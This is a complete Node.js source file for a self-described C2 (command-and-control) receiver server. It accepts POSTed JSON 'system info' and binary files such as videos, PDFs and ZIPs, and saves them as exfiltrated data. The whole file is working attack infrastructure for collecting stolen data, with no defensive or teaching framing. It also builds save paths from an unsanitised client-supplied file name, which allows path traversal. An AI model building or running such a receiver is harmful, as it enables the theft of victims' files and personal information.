const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 3000;
const RECEIVE_DIR = path.join(__dirname, 'received-data');

// Ensure the received-data directory exists
if (!fs.existsSync(RECEIVE_DIR)) {
    fs.mkdirSync(RECEIVE_DIR, { recursive: true });
}

const server = http.createServer((req, res) => {
    // Only accept POST requests
    if (req.method === 'POST') {
        const contentType = req.headers['content-type'] || '';

        // Handle JSON Payload (System Info & Text Files)
        if (contentType.includes('application/json')) {
            let body = '';
            req.on('data', chunk => { body += chunk.toString(); });
            
            req.on('end', () => {
                try {
                    const parsedData = JSON.parse(body);
                    const timestamp = Date.now();
                    const infoPath = path.join(RECEIVE_DIR, `exfiltrated-data-${timestamp}.json`);
                    
                    // Save the JSON to the received-data folder
                    fs.writeFileSync(infoPath, JSON.stringify(parsedData, null, 2));
                    console.log(`[C2 SERVER] 🟢 Received JSON Payload. Saved to: ${infoPath}`);
                    
                    res.writeHead(200, { 'Content-Type': 'text/plain' });
                    res.end('JSON received successfully');
                } catch (e) {
                    console.error(`[C2 SERVER] 🔴 Error parsing JSON:`, e.message);
                    res.writeHead(400, { 'Content-Type': 'text/plain' });
                    res.end('Invalid JSON');
                }
            });
        } 
        // Handle Binary Streams (Videos, PDFs, ZIPs)
        else if (contentType.includes('application/octet-stream')) {
            const fileName = req.headers['x-file-name'] || `unknown-file-${Date.now()}.bin`;
            const filePath = path.join(RECEIVE_DIR, fileName);
            
            console.log(`[C2 SERVER] 🔵 Receiving binary stream: ${fileName}...`);
            const writeStream = fs.createWriteStream(filePath);
            
            // Pipe the incoming network stream directly into the file stream
            req.pipe(writeStream);
            
            req.on('end', () => {
                console.log(`[C2 SERVER] ✅ Successfully saved binary file: ${fileName}`);
                res.writeHead(200, { 'Content-Type': 'text/plain' });
                res.end('File received successfully');
            });
            
            writeStream.on('error', (err) => {
                console.error(`[C2 SERVER] 🔴 Error writing file ${fileName}:`, err.message);
                res.writeHead(500, { 'Content-Type': 'text/plain' });
                res.end('Internal Server Error');
            });
        } 
        else {
            res.writeHead(415, { 'Content-Type': 'text/plain' });
            res.end('Unsupported Media Type');
        }
    } else {
        res.writeHead(405, { 'Content-Type': 'text/plain' });
        res.end('Method Not Allowed');
    }
});

server.listen(PORT, () => {
    console.log(`\n=================================================`);
    console.log(`📡 C2 RECEIVER SERVER IS ONLINE`);
    console.log(`=================================================`);
    console.log(`Listening for exfiltrated data on port ${PORT}...`);
    console.log(`Data will be saved to: ${RECEIVE_DIR}\n`);
});